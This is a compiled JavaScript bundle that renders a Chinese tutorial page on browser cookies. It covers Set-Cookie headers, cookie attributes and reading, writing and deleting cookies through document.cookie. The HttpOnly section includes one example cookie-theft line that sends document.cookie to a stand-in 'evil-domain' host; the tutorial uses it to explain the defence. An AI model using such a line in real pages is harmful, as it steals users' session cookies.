(window.webpackJsonp=window.webpackJsonp||[]).push([[29],{354:function(t,e,s){"use strict";s.r(e);var a=s(0),o=Object(a.a)({},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"content"},[t._m(0),t._v(" "),t._m(1),t._v(" "),s("p",[t._v("Cookie 是服务器保存在浏览器的一小段文本信息，每个 Cookie 的大小一般不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。")]),t._v(" "),s("p",[t._v("Cookie 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。它的常用场合有以下一些。")]),t._v(" "),t._m(2),t._v(" "),s("p",[t._v("有些开发者使用 Cookie 作为客户端储存。这样做虽然可行，但是并不推荐，因为 Cookie 的设计目标并不是这个，它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。")]),t._v(" "),s("p",[t._v("Cookie 包含以下几方面的信息。")]),t._v(" "),t._m(3),t._v(" "),t._m(4),t._v(" "),t._m(5),t._v(" "),t._m(6),s("p",[t._v("不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。")]),t._v(" "),t._m(7),t._v(" "),t._m(8),t._v(" "),s("p",[t._v("Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。")]),t._v(" "),t._m(9),t._v(" "),t._m(10),t._v(" "),t._m(11),t._v(" "),t._m(12),t._m(13),t._v(" "),t._m(14),s("p",[t._v("上面的几个属性的含义，将在后文解释。")]),t._v(" "),t._m(15),t._v(" "),t._m(16),t._m(17),t._v(" "),t._m(18),t._m(19),t._v(" "),t._m(20),s("p",[t._v("只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。")]),t._v(" "),t._m(21),t._m(22),t._v(" "),t._m(23),s("p",[t._v("上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。")]),t._v(" "),t._m(24),t._v(" "),t._m(25),t._v(" "),s("p",[t._v("可以打开Google Chrome浏览器的开发者工具，点击Network选择一个请求，在Request Headers里面可以看见Cookie字段，里面有发送的cookie值。")]),t._v(" "),t._m(26),t._v(" "),t._m(27),s("p",[t._v("下面是一个例子。")]),t._v(" "),t._m(28),s("p",[t._v("服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。")]),t._v(" "),t._m(29),t._v(" "),t._m(30),t._v(" "),t._m(31),t._v(" "),t._m(32),t._v(" "),t._m(33),t._m(34),t._v(" "),t._m(35),t._v(" "),t._m(36),t._v(" "),t._m(37),t._v(" "),t._m(38),t._v(" "),t._m(39),t._v(" "),t._m(40),t._v(" "),t._m(41),t._v(" "),t._m(42),t._v(" "),t._m(43),t._v(" "),t._m(44),t._m(45),t._v(" "),t._m(46),t._v(" "),t._m(47),t._v(" "),t._m(48),t._v(" "),t._m(49),t._m(50),t._v(" "),t._m(51),t._m(52),t._v(" "),t._m(53),t._m(54),t._v(" "),t._m(55),t._v(" "),t._m(56),t._m(57),t._v(" "),s("p",[t._v("写入 Cookie 的时候，可以一起写入 Cookie 的属性。")]),t._v(" "),t._m(58),t._m(59),t._v(" "),s("p",[t._v("各个属性的写入注意点如下。")]),t._v(" "),t._m(60),t._v(" "),t._m(61),t._v(" "),s("p",[t._v("document.cookie = 'fontSize=14; '  + 'expires=' + someDate.toGMTString() + '; '  + 'path=/subdirectory; '  + 'domain=*.example.com';")]),t._v(" "),s("p",[t._v("Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。")]),t._v(" "),t._m(62),t._v(" "),t._m(63),t._m(64),t._v(" "),t._m(65),t._v(" "),t._m(66),t._v(" "),t._m(67),t._v(" "),t._m(68),t._v(" "),s("p",[t._v("使用document.cookie来创建修改cookie，如果没该值，那么创建，如果存在则修改：")]),t._v(" "),t._m(69),t._m(70),t._v(" "),t._m(71),s("p",[t._v("注意：如果设置了HttpOnly，则无法读取到cookie的值。")]),t._v(" "),s("p",[t._v("另一种方法使用正则查找：")]),t._v(" "),t._m(72),t._m(73),t._v(" "),t._m(74),t._v(" "),t._m(75),s("p",[t._v("注意：如果设置了HttpOnly，则无法删除cookie的值。")]),t._v(" "),t._m(76),t._v(" "),s("p",[s("a",{attrs:{href:"http://javascript.ruanyifeng.com/bom/cookie.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("Cookie 阮一峰旧网址"),s("OutboundLink")],1)]),t._v(" "),s("p",[s("a",{attrs:{href:"https://wangdoc.com/javascript/bom/cookie.html#documentcookie",target:"_blank",rel:"noopener noreferrer"}},[t._v("Cookie 阮一峰新网址"),s("OutboundLink")],1)])])},[function(){var t=this.$createElement,e=this._self._c||t;return e("h1",{attrs:{id:"cookie"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#cookie","aria-hidden":"true"}},[this._v("#")]),this._v(" cookie")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h2",{attrs:{id:"_1-概述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_1-概述","aria-hidden":"true"}},[this._v("#")]),this._v(" 1. 概述")])},function(){var t=this.$createElement,e=this._self._c||t;return e("ul",[e("li",[this._v("对话（session）管理：保存登录、购物车等需要记录的信息。")]),this._v(" "),e("li",[this._v("个性化：保存用户的偏好，比如网页的字体大小、背景色等等。")]),this._v(" "),e("li",[this._v("追踪：记录和分析用户行为。")])])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("ul",[s("li",[t._v("Cookie 的名字")]),t._v(" "),s("li",[t._v("Cookie 的值（真正的数据写在这里面）")]),t._v(" "),s("li",[t._v("到期时间")]),t._v(" "),s("li",[t._v("所属域名（默认是当前域名）")]),t._v(" "),s("li",[t._v("生效的路径（默认是当前网址）")])])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[t._v("举例来说，用户访问网址"),s("code",[t._v("www.example.com")]),t._v("，服务器在浏览器写入一个 Cookie。这个 Cookie 就会包含"),s("code",[t._v("www.example.com")]),t._v("这个域名，以及根路径"),s("code",[t._v("/")]),t._v("。这意味着，这个 Cookie 对该域名的根路径和它的所有子路径都有效。如果路径设为"),s("code",[t._v("/forums")]),t._v("，那么这个 Cookie 只有在访问"),s("code",[t._v("www.example.com/forums")]),t._v("及其子路径时才有效。以后，浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("浏览器可以设置不接受 Cookie，也可以设置不向服务器发送 Cookie。"),e("code",[this._v("window.navigator.cookieEnabled")]),this._v("属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-javascript extra-class"},[s("pre",{pre:!0,attrs:{class:"language-javascript"}},[s("code",[s("span",{attrs:{class:"token comment"}},[t._v("// 浏览器是否打开 Cookie 功能")]),t._v("\nwindow"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("navigator"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookieEnabled "),s("span",{attrs:{class:"token comment"}},[t._v("// true")]),t._v("\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，"),e("code",[this._v("http://example.com")]),this._v("设置的 Cookie，可以被"),e("code",[this._v("https://example.com")]),this._v("读取。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h2",{attrs:{id:"_2-cookie-与-http-协议"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_2-cookie-与-http-协议","aria-hidden":"true"}},[this._v("#")]),this._v(" 2. Cookie 与 HTTP 协议")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"_2-1-http-回应：cookie-的生成"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_2-1-http-回应：cookie-的生成","aria-hidden":"true"}},[this._v("#")]),this._v(" 2.1 HTTP 回应：Cookie 的生成")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个"),e("code",[this._v("Set-Cookie")]),this._v("字段。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("HTTP 回应可以包含多个"),e("code",[this._v("Set-Cookie")]),this._v("字段，即在浏览器生成多个 Cookie。下面是一个例子。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[this._v("HTTP/1.0 200 OK\nContent-type: text/html\nSet-Cookie: yummy_cookie=choco\nSet-Cookie: tasty_cookie=strawberry\n\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("除了 Cookie 的值，"),e("code",[this._v("Set-Cookie")]),this._v("字段还可以附加 Cookie 的属性。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[this._v("Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>\nSet-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>\nSet-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>\nSet-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>\nSet-Cookie: <cookie-name>=<cookie-value>; Secure\nSet-Cookie: <cookie-name>=<cookie-value>; HttpOnly\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("一个"),e("code",[this._v("Set-Cookie")]),this._v("字段里面，可以同时包括多个属性，没有次序的要求。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[this._v("Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly\n")])])])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[t._v("如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的"),s("code",[t._v("key")]),t._v("、"),s("code",[t._v("domain")]),t._v("、"),s("code",[t._v("path")]),t._v("和"),s("code",[t._v("secure")]),t._v("都匹配。举例来说，如果原始的 Cookie 是用如下的"),s("code",[t._v("Set-Cookie")]),t._v("设置的。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[this._v("Set-Cookie: key1=value1; domain=example.com; path=/blog\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("改变上面这个 Cookie 的值，就必须使用同样的"),e("code",[this._v("Set-Cookie")]),this._v("。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[this._v("Set-Cookie: key1=value2; domain=example.com; path=/blog\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[this._v("Set-Cookie: key1=value2; domain=example.com; path=/\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("上面的命令设置了一个全新的同名 Cookie，但是"),e("code",[this._v("path")]),this._v("属性不一样。下一次访问"),e("code",[this._v("example.com/blog")]),this._v("的时候，浏览器将向服务器发送两个同名的 Cookie。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[this._v("Cookie: key1=value1; key1=value2\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"_2-2-http-请求：cookie-的发送"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_2-2-http-请求：cookie-的发送","aria-hidden":"true"}},[this._v("#")]),this._v(" 2.2 HTTP 请求：Cookie 的发送")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的"),e("code",[this._v("Cookie")]),this._v("字段。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[e("code",[this._v("Cookie")]),this._v("字段可以包含多个 Cookie，使用分号（"),e("code",[this._v(";")]),this._v("）分隔。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[this._v("Cookie: name=value; name2=value2; name3=value3\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[this._v("GET /sample_page.html HTTP/1.1\nHost: www.example.org\nCookie: yummy_cookie=choco; tasty_cookie=strawberry\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("ul",[e("li",[this._v("Cookie 的各种属性，比如何时过期。")]),this._v(" "),e("li",[this._v("哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。")])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h2",{attrs:{id:"_3-cookie-的属性"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_3-cookie-的属性","aria-hidden":"true"}},[this._v("#")]),this._v(" 3. Cookie 的属性")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"_3-1-expires，max-age"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_3-1-expires，max-age","aria-hidden":"true"}},[this._v("#")]),this._v(" 3.1 Expires，Max-Age")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[e("code",[this._v("Expires")]),this._v("属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用"),e("code",[this._v("Date.prototype.toUTCString()")]),this._v("进行格式转换。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[this._v("Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("如果不设置该属性，或者设为"),e("code",[this._v("null")]),this._v("，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[e("code",[this._v("Max-Age")]),this._v("属性指定从现在开始 Cookie 存在的秒数，比如"),e("code",[this._v("60 * 60 * 24 * 365")]),this._v("（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("如果同时指定了"),e("code",[this._v("Expires")]),this._v("和"),e("code",[this._v("Max-Age")]),this._v("，那么"),e("code",[this._v("Max-Age")]),this._v("的值将优先生效。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("如果"),e("code",[this._v("Set-Cookie")]),this._v("字段没有指定"),e("code",[this._v("Expires")]),this._v("或"),e("code",[this._v("Max-Age")]),this._v("属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"_3-2-domain，path"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_3-2-domain，path","aria-hidden":"true"}},[this._v("#")]),this._v(" 3.2 Domain，Path")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[s("code",[t._v("Domain")]),t._v("属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前 URL 的一级域名，比如"),s("code",[t._v("www.example.com")]),t._v("会设为"),s("code",[t._v("example.com")]),t._v("，而且以后如果访问"),s("code",[t._v("example.com")]),t._v("的任何子域名，HTTP 请求也会带上这个 Cookie。如果服务器在"),s("code",[t._v("Set-Cookie")]),t._v("字段指定的域名，不属于当前域名，浏览器会拒绝这个 Cookie。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[s("code",[t._v("Path")]),t._v("属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，"),s("code",[t._v("Path")]),t._v("属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，"),s("code",[t._v("PATH")]),t._v("属性是"),s("code",[t._v("/")]),t._v("，那么请求"),s("code",[t._v("/docs")]),t._v("路径也会包含该 Cookie。当然，前提是域名必须一致。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"_3-3-secure，httponly"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_3-3-secure，httponly","aria-hidden":"true"}},[this._v("#")]),this._v(" 3.3 Secure，HttpOnly")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[e("code",[this._v("Secure")]),this._v("属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的"),e("code",[this._v("Secure")]),this._v("属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[e("code",[this._v("HttpOnly")]),this._v("属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是"),e("code",[this._v("Document.cookie")]),this._v("属性、"),e("code",[this._v("XMLHttpRequest")]),this._v("对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[this._v('(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;\n')])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的"),e("code",[this._v("HttpOnly")]),this._v("属性，上面代码就不会读到该 Cookie。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h2",{attrs:{id:"_4-document-cookie"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_4-document-cookie","aria-hidden":"true"}},[this._v("#")]),this._v(" 4. document.cookie")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[e("code",[this._v("document.cookie")]),this._v("属性用于读写当前网页的 Cookie。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有"),e("code",[this._v("HTTPOnly")]),this._v("属性。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[this._v('document.cookie // "foo=bar;baz=bar"\n')])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("上面代码从"),e("code",[this._v("document.cookie")]),this._v("一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[this._v("var cookies = document.cookie.split(';');\n\nfor (var i = 0; i < cookies.length; i++) {\n  console.log(cookies[i]);\n}\n// foo=bar\n// baz=bar\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[e("code",[this._v("document.cookie")]),this._v("属性是可写的，可以通过它为当前网站添加 Cookie。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[this._v("document.cookie = 'fontSize=14';\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("写入的时候，Cookie 的值必须写成"),e("code",[this._v("key=value")]),this._v("的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用"),e("code",[this._v("encodeURIComponent")]),this._v("方法达到。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("但是，"),e("code",[this._v("document.cookie")]),this._v("一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[this._v("document.cookie = 'test1=hello';\ndocument.cookie = 'test2=world';\ndocument.cookie\n// test1=hello;test2=world\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[e("code",[this._v("document.cookie")]),this._v("读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，"),e("code",[this._v("Cookie")]),this._v("字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，"),e("code",[this._v("Set-Cookie")]),this._v("字段是一行设置一个 Cookie。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[this._v('document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";\n\n')])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("上面代码中，写入 Cookie 的时候，同时设置了"),e("code",[this._v("expires")]),this._v("属性。属性值的等号两边，也是不能有空格的。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("ul",[s("li",[s("code",[t._v("path")]),t._v("属性必须为绝对路径，默认为当前路径。")]),t._v(" "),s("li",[s("code",[t._v("domain")]),t._v("属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是"),s("code",[t._v("example.com")]),t._v("，就不能将其设为"),s("code",[t._v("foo.com")]),t._v("。该属性默认为当前的一级域名（不含二级域名）。")]),t._v(" "),s("li",[s("code",[t._v("max-age")]),t._v("属性的值为秒数。")]),t._v(" "),s("li",[s("code",[t._v("expires")]),t._v("属性的值为 UTC 格式，可以使用"),s("code",[t._v("Date.prototype.toUTCString()")]),t._v("进行日期格式转换。")])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[e("code",[this._v("document.cookie")]),this._v("写入 Cookie 的例子如下。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("删除一个现存 Cookie 的唯一方法，是设置它的"),e("code",[this._v("expires")]),this._v("属性为一个过去的日期。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[this._v("document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';\n\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("上面代码中，名为"),e("code",[this._v("fontSize")]),this._v("的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h2",{attrs:{id:"_5-实际工作中对cookie的操作"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_5-实际工作中对cookie的操作","aria-hidden":"true"}},[this._v("#")]),this._v(" 5. 实际工作中对cookie的操作")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"_5-1-在chrome浏览器中查看网站cookie"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_5-1-在chrome浏览器中查看网站cookie","aria-hidden":"true"}},[this._v("#")]),this._v(" 5.1 在Chrome浏览器中查看网站cookie")])},function(){var t=this.$createElement,e=this._self._c||t;return e("ol",[e("li",[this._v("打开开发者工具(View-> Developer -> Developer Tools)")]),this._v(" "),e("li",[this._v("选择Application，在左边有个：Storage -> Cookies, 选择当前的网址点击就能看见Cookie")])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"_5-2-创建、修改cookie"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_5-2-创建、修改cookie","aria-hidden":"true"}},[this._v("#")]),this._v(" 5.2 创建、修改cookie")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-javascript extra-class"},[s("pre",{pre:!0,attrs:{class:"language-javascript"}},[s("code",[s("span",{attrs:{class:"token comment"}},[t._v("// 打开Google Chrome浏览器开发者工具，找一个网站，在控制台中测试")]),t._v("\ndocument"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie "),s("span",{attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{attrs:{class:"token string"}},[t._v("'name=jack'")]),t._v("\t"),s("span",{attrs:{class:"token comment"}},[t._v('// "name=jack", 由于没有name，所以会创建各一个cookie')]),t._v("\ndocument"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie\t\t\t\t\t"),s("span",{attrs:{class:"token comment"}},[t._v('// "name=jack"')]),t._v("\ndocument"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie "),s("span",{attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{attrs:{class:"token string"}},[t._v("'name=make'")]),t._v("\t"),s("span",{attrs:{class:"token comment"}},[t._v('// "name=make" 此时修改一个cookie的值')]),t._v("\n"),s("span",{attrs:{class:"token comment"}},[t._v("// 设置cookie的同事设置一个过期时间")]),t._v("\ndocument"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie "),s("span",{attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{attrs:{class:"token string"}},[t._v('"foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT"')]),s("span",{attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{attrs:{class:"token comment"}},[t._v("// 设置 Domain，Path")]),t._v("\ndocument"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie "),s("span",{attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{attrs:{class:"token string"}},[t._v('"qq=ww; domain=jirengu.com; path=/sulaleyogo"')]),t._v("\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"_5-3-读取cookie"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_5-3-读取cookie","aria-hidden":"true"}},[this._v("#")]),this._v(" 5.3 读取cookie")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-javascript extra-class"},[s("pre",{pre:!0,attrs:{class:"language-javascript"}},[s("code",[s("span",{attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),s("span",{attrs:{class:"token function"}},[t._v("getCookie")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),t._v("name"),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),s("span",{attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),t._v("document"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("length"),s("span",{attrs:{class:"token operator"}},[t._v(">")]),s("span",{attrs:{class:"token number"}},[t._v("0")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        start"),s("span",{attrs:{class:"token operator"}},[t._v("=")]),t._v("document"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token function"}},[t._v("indexOf")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),t._v("name "),s("span",{attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),s("span",{attrs:{class:"token string"}},[t._v('"="')]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{attrs:{class:"token comment"}},[t._v("//返回某指定值在字符串中首次出现的位置。")]),t._v("\n        "),s("span",{attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),t._v("start"),s("span",{attrs:{class:"token operator"}},[t._v("!=")]),s("span",{attrs:{class:"token operator"}},[t._v("-")]),s("span",{attrs:{class:"token number"}},[t._v("1")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{attrs:{class:"token punctuation"}},[t._v("{")]),t._v(" \n            start "),s("span",{attrs:{class:"token operator"}},[t._v("=")]),t._v(" start "),s("span",{attrs:{class:"token operator"}},[t._v("+")]),t._v(" name"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("length"),s("span",{attrs:{class:"token operator"}},[t._v("+")]),s("span",{attrs:{class:"token number"}},[t._v("1")]),s("span",{attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" \n            end"),s("span",{attrs:{class:"token operator"}},[t._v("=")]),t._v("document"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token 